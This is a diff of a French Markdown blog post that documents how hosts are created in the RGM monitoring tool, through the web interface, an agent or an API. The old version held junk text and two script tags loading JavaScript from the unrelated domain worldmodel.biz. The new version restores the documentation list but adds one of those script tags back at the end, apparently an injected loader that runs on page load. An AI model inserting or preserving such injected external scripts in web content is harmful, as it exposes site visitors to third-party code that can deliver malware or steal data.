@@ -9,4 +9,27 @@ permalink: >
 published: true
 post_date: 2020-02-17 09:12:16
 ---
-cdzcZFEZCZEC <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
+La création des Hosts dans RGM peuvent être effectuée via différentes méthodes : 
+<li style="list-style-type: none;">
+  <ul>
+    <li style="list-style-type: none;">
+      <ul>
+        <li style="list-style-type: none;">
+          <ul style="list-style-type: disc;">
+            <li>
+              Déclaration et configuration dans l'interface Web
+            </li>
+            <li>
+              Inscription automatisée avec agent
+            </li>
+            <li>
+              Utilisation de l'API "RGMAPI"
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</li>       
+
+<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
